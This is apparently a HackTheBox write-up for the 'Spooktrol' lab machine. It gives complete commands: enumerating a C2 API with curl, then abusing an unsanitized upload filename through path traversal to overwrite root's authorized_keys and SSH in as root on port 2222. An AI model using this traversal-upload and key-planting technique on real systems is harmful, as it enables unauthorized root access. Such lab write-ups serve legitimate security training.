---
title: "Spooktrol"
date: 2026-11-11 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, hard, c2, file-upload, path-traversal, ssh, api]
description: "Spooktrol is a Hard Linux box built around a homemade malware command-and-control server. Its file-upload API trusts the client-supplied filename, so a directory-traversal path writes our SSH public key straight into the container root's authorized_keys — SSH on the internal port 2222 then lands the user flag. This post covers recon through user.txt."
image:
    path: /assets/Images/spooktrol-002_exploit_traversal-upload.png
---

## Overview

Spooktrol is a Hard Linux machine themed around a malware **command-and-control (C2)** server. The HTTP service is a small Python/uvicorn API for tasking implants, and its file-upload endpoint does not sanitize the uploaded filename. A path-traversal filename lets us write an arbitrary file anywhere the (root) service can reach — we drop our own SSH public key into root's `authorized_keys` and log in over the internal container SSH on port 2222 to grab `user.txt`.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH 8.2p1 | host SSH |
| 80   | http (uvicorn) | malware C2 API (JSON) |
| 2222 | OpenSSH 8.2p1 | container SSH |

```bash
nmap -sC -sV 10.129.96.46
```

Two SSH servers stand out — one on 22 (the host) and one on 2222 (an internal Docker container). The web server on 80 returns JSON and identifies itself as `uvicorn`, a Python ASGI server.

## Enumeration

The root path hands out an `auth` token, and `robots.txt` points at the implant download:

```bash
curl -s http://10.129.96.46/
# {"auth":"186af7d38764d35ce547d5aa204e6502"}
curl -s http://10.129.96.46/robots.txt
# Disallow: /file_management/?file=implant
```

![auth token](/assets/Images/spooktrol-001_recon_auth-token.png)

Fuzzing the API surfaces the routes that matter: `/file_management/`, `/poll`, `/result`, and `/file_upload/`. The `/file_management/?file=implant` route serves the compiled C2 implant (a static ELF), and `/file_upload/` is the endpoint the implant uses to push files back to the server. That upload endpoint is where the filename is trusted.

## Foothold

The upload is a multipart `PUT` to `/file_upload/`, authenticated with the `auth` cookie from the root path. The server saves the file using the `filename` field verbatim — so a traversal sequence in the filename escapes the upload directory. The C2 daemon runs as root, so we can write into `/root/.ssh/`.

Grab the auth cookie, generate a keypair, and write our public key over root's `authorized_keys`:

```bash
AUTH=$(curl -s -H "Host: spooktrol.htb" http://10.129.96.46/ | python3 -c 'import sys,json;print(json.load(sys.stdin)["auth"])')
ssh-keygen -t ed25519 -f spook -N ''
curl -s -X PUT http://10.129.96.46/file_upload/ -H "Host: spooktrol.htb" -b "auth=$AUTH" \
  -F 'file=@spook.pub;filename=../../../../../../root/.ssh/authorized_keys;type=text/plain'
# {"message":"File upload successful /file_management/?file=../../../../../../root/.ssh/authorized_keys"}
```

![traversal upload](/assets/Images/spooktrol-002_exploit_traversal-upload.png)

Now SSH in as root — on **port 2222**, the container's SSH, not the host's on 22:

```bash
chmod 600 spook
ssh -i spook -p 2222 root@10.129.96.46
# uid=0(root)  hostname: spook2  (/.dockerenv present)
```

![user flag](/assets/Images/spooktrol-003_foothold_user-flag.png)

## User flag

```bash
cat /root/user.txt   # HTB{...}
```

Root inside the container — `user.txt` captured.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
